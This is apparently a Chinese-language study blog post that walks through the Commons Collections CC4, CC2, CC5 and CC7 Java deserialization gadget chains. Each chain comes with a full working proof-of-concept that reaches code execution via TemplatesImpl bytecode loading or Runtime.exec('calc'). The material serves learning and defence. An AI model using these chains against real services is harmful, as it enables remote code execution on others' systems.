---
title: CC4_CC2_CC5_CC7
date: 2025-09-02T19:00:00+08:00
tags:
  - "CC链-反序列化"
categories:
  - "Java安全"
description: Java 反序列化学习 - CC4&CC2&CC5&CC7链
showToc: true
draft: false
tocOpen: true
---
# CC4
## 环境：
+ <font style="color:rgb(80, 80, 92);">Commons-Collections 4.0</font>

[https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0](https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0)

```xml
<dependencies>
  <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 -->
  <dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
  </dependency>
</dependencies>
```

+ JDK 8u65



## 分析：
以 <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform 为出发点，往回找</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852635.png)

<font style="color:#080808;background-color:#ffffff;">找到 TransformingComparator.compare 中调用了 transform 方法</font>

<font style="color:#080808;background-color:#ffffff;">再找到 PriorityQueue 类中：</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852526.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852926.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853566.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853113.png)

<font style="color:#080808;background-color:#ffffff;"></font>

最后找到的链也就是：

<font style="color:#080808;background-color:#ffffff;">PriorityQueue.</font>

<font style="color:#080808;background-color:#ffffff;">readObject</font>

<font style="color:#080808;background-color:#ffffff;">heapify</font>

<font style="color:#080808;background-color:#ffffff;">siftDown</font>

<font style="color:#080808;background-color:#ffffff;">siftDownUsingComparator</font>

<font style="color:#080808;background-color:#ffffff;">compare</font>

<font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font>**<font style="color:#080808;background-color:#ffffff;"></font>**

<font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font>



<font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font>

->

<font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font>

->

<font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font>

<font style="color:#080808;background-color:#ffffff;"></font>

## <font style="color:#080808;background-color:#ffffff;">编写 POC：</font>
先将 CC3 的代码执行部分拿来：

```java
//代码执行 InstantiateTransformer
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameFiled = tc.getDeclaredField("_name");
nameFiled.setAccessible(true);
nameFiled.set(templates, "aaa");
Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
bytecodesFiled.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
byte[][] codes = {code};
bytecodesFiled.set(templates, codes);

InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    instantiateTransformer
};

ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);
```

<font style="color:#080808;background-color:#ffffff;">对照源码进行构造：</font>

```java
TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
```

<font style="color:#080808;background-color:#ffffff;">写好之后，发现没有反应</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853126.png)

调试来到此处：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853395.png)

看到 size:0 ，不会进入 siftDown.

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853636.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853140.png)![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853829.png)

> `for (int i = (size >>> 1) - 1; i >= 0; i--)`
>
> ### 1. `size >>> 1`
> + `>>>` 是 **无符号右移运算符**。
> + `size >>> 1` 等价于 `size / 2`（向下取整），但不同于 `/2` 的地方在于：
>     - `/2` 是普通的除法运算；
>     - `>>> 1` 是位运算，执行效率更高（尤其是在底层算法里）。
>
> 所以 `size >>> 1` 就是 **数组长度的一半**。
>
> ### 2. `(size >>> 1) - 1`
> + 先取数组长度的一半，再减去 1。
> + 结果是 **从数组的最后一个非叶子节点开始的位置**。
>
> 例如在堆排序或优先队列的实现中：
>
> + 叶子节点的下标范围是 `size/2 ~ size-1`。
> + 非叶子节点的最后一个位置就是 `(size/2)-1`。
>
> ### 3. `for (int i = ...; i >= 0; i--)`
> + `i` 从 `(size >>> 1) - 1` 开始，递减到 `0`。
> + 也就是说：**循环会从最后一个非叶子节点开始，往前遍历所有非叶子节点，直到根节点**。
>
> 这是一个建堆（heapify）的实现。作用是：**从最后一个非叶子节点开始，依次向前调整，直到把整个数组调整成一个堆结构**。  
>

所以要保证 size 为 2 才能进入 for 循环执行代码

于是添加：

```java
priorityQueue.add(1);
priorityQueue.add(2);
```

此时执行代码后报错了

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853681.png)

跟进 add 函数：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854556.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854839.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854687.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854246.png)

发现 add 函数也会调用 <font style="color:#080808;background-color:#ffffff;">compare，而当 add 调用 compare 也就会调用 </font>transform

而我们知道 _tfactory 在反序列化的时候才会被赋值	【CC3 中分析 利用 TemplatesImpl 加载字节码 时提及】

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854728.png)



所以，先给  <font style="color:#080808;background-color:#ffffff;">transformers/chainedTransformer 传一个没用的东西，让 add 执行时不会调用</font>

<font style="color:#080808;background-color:#ffffff;">compare.transform ,在反序列化时再赋给正常值。</font>

```java
ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer(1));
        //TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformerField = c.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator, chainedTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
```

这样就可以正常执行了

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854475.png)

### 完整的POC：
```java
package com.CC4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4Test {
    public static void main(String[] args) throws Exception {

        //代码执行 InstantiateTransformer
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer<>(transformers);

        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer(1));
        //TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformerField = c.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator, chainedTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```









# CC2
## 分析：
CC2 和 CC4 并无太大区别，CC2 的前半部分同样为：<font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font>

-> <font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font>

-> <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font>

<font style="color:#080808;background-color:#ffffff;">之后，CC4：</font>

<font style="color:rgb(44, 62, 80);">InstantiateTransformer.transform </font>

<font style="color:rgb(44, 62, 80);">-> TrAXFilter.TrAXFilter</font>

<font style="color:#080808;background-color:#ffffff;">-> TemplatesImpl.newTransforemer</font>

-> TransletClassLoader.newInstance

CC2:

InvokerTransformer.transform

<font style="color:#080808;background-color:#ffffff;">-> TemplatesImpl.newTransforemer</font>

-> TransletClassLoader.newInstance







## 完整POC
```java
package com.CC2;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2Test {
    public static void main(String[] args) throws Exception {
        //代码执行 
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameFiled = tc.getDeclaredField("_name");
        nameFiled.setAccessible(true);
        nameFiled.set(templates, "aaa");
        Field bytecodesFiled = tc.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E://Test.class"));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);
        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        //改为 templates
        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field transformerField = c.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        //改为 invokerTransformer
        transformerField.set(transformingComparator, invokerTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854831.png)





# CC5
## 分析：
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854635.png)



CC5 的起点变成了 BadAttributeValueExpException,调用的是 TiedMapEntry.toString ，之后便是 LazyMap.get（CC1-LazyMap/CC6）。

这里从正向走比较方便，如果从 LazyMap.get 出发，会用很多调用 get 方法的类，不好找。



来到 BadAttributeValueExpException 类，跟进 toString() 方法

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854357.png)

这里的 toString() 方法要找到调用它的类，然后就找到了 TiedMapEntry 类中调用的 toString

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854464.png)

getValue 调用了 map.get，后续便是 LazyMap 调用 get。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855986.png)

## POC：
```java
package com.CC5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5Test {
    public static void main(String[] args) throws Exception {

        // CC1-LazyMap
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"key");
        tiedMapEntry.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射修改 BadAttributeValueExpException 的 val 值
        Class c = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = c.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855664.png)



# CC7
## 分析：
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855345.png)



CC7 的入口点变成了： HashTable.readObject

HashTable 中的 readObject 调用了 <font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855669.png)

<font style="color:#080808;background-color:#ffffff;">reconstitutionPut中调用了 equals ,</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855139.png)

因为 LazyMap 不存在 equals 方法，然后找到它的父类 AbstractMapDecorator 调用 equals 

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855169.png)

找到 AbstractMap.equals 中调用了 get 方法

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855646.png)



## 构造POC：
### AbstractMap.equals
```java
public abstract class AbstractMap<K,V> implements Map<K,V> {
    ...
    public boolean equals(Object o) {
    //判断传入的是否为同一对象
    if (o == this)
        return true;

    //类型检查
    if (!(o instanceof Map))
        return false;
    Map<?,?> m = (Map<?,?>) o;
    //比较两个 map 的 size() 
    if (m.size() != size())
        return false;

    try {
        //entrySet() 的迭代器，用于遍历所有键值对（Entry<K,V>）
        Iterator<Entry<K,V>> i = entrySet().iterator();
        //遍历每一个映射条目，取出 key 和 value，准备与另一个 map m 中对应的值做比较
        while (i.hasNext()) {
            Entry<K,V> e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            
            if (value == null) {
                //value == null 进入
                if (!(m.get(key)==null && m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))
                    return false;
            }
        }
    } catch (ClassCastException unused) {
        return false;
    } catch (NullPointerException unused) {
        return false;
    }

    return true;
}
    ...
}
```

### <font style="color:rgb(44, 62, 80);">Hashtable.</font><font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font>
```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    //计算 key 的哈希值
    int hash = key.hashCode();
    //% tab.length 将哈希值映射到数组索引范围
    int index = (hash & 0x7FFFFFFF) % tab.length;
    //从 tab[index] 中将 Entry 放入循环
    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
        //先 e.hash == hash，比较已有元素和新元素的hash是否相同
        //一样之后，接着调用 e.key.equals(key)，比较已有元素的key和新的key是否相同
        if ((e.hash == hash) && e.key.equals(key)) {
            //如果 key重复，抛出异常
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    @SuppressWarnings("unchecked")
    Entry<K,V> e = (Entry<K,V>)tab[index];
    tab[index] = new Entry<>(hash, key, value, e);
    count++;
}
```

**注意：首先满足 value != null，之后满足俩个元素的 hash 值相同，然后在判断 key 是否重复时触发 equals 方法 **



### <font style="color:rgb(26, 32, 44);">HashTable.readObject</font>
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException
{
    // Read in the length, threshold, and loadfactor
    s.defaultReadObject();

    // Read the original length of the array and number of elements
    int origlength = s.readInt();
    int elements = s.readInt();

    // Compute new size with a bit of room 5% to grow but
    // no larger than the original size.  Make the length
    // odd if it's large enough, this helps distribute the entries.
    // Guard against the length ending up zero, that's not valid.
    int length = (int)(elements * loadFactor) + (elements / 20) + 3;
    if (length > elements && (length & 1) == 0)
        length--;
    if (origlength > 0 && length > origlength)
        length = origlength;
    table = new Entry<?,?>[length];
    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
    count = 0;

    // Read the number of elements and then all the key/value objects
    //反序列化
    for (; elements > 0; elements--) {
        @SuppressWarnings("unchecked")
        K key = (K)s.readObject();
        @SuppressWarnings("unchecked")
        V value = (V)s.readObject();
        // synch could be eliminated for performance
        reconstitutionPut(table, key, value);
    }
}
```





### 构造：
**ysoserial：**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855518.png)



结合上述代码的分析，ysoserial 这里要写 **俩个 put 的作用**便是：

在 Hashtable 放入俩个 lazyMap ,制造“冲突”，迫使他们进入

```java
for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
        throw new java.io.StreamCorruptedException();
        }
    }
```

同时要让俩个元素的哈希值相同【(e.hash == hash)】，然后就会触发 `key.equals()` 的比较。  
而 `equals()` 内部会调用到 `LazyMap.get()`，最终触发 `transformerChain` 执行恶意代码



```java
//首先创建俩个map
Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        //俩个元素的hash值一样
        Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        lazyMap1.put("yy", 1);
        
        Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        lazyMap2.put("zZ", 1);


        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);

        // 这里的问题在urldns 和 CC6 中均有提及
        //https://www.yuque.com/taohuayuanpang/qxcvxi/qvul6kkfwvcanocn#ZLUWn
        lazyMap1.remove("yy");
```



> <font style="color:rgb(44, 62, 80);">hash相同的值：</font>
>
> yy与zZ
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856813.png)  
Ea与FB
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856867.png)
>



### 完整POC：
```java
package com.CC7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7Test {
    public static void main(String[] args) throws Exception{
        // CC1-LazyMap
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});


        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        lazyMap2.put("zZ", 1);

//        System.out.println(lazyMap1.hashCode());
//        System.out.println(lazyMap2.hashCode());

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);

        lazyMap2.remove("yy");

        Class c = ChainedTransformer.class;
        Field field = c.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);


        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856148.png)











# 总结：
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856619.png)





















































































































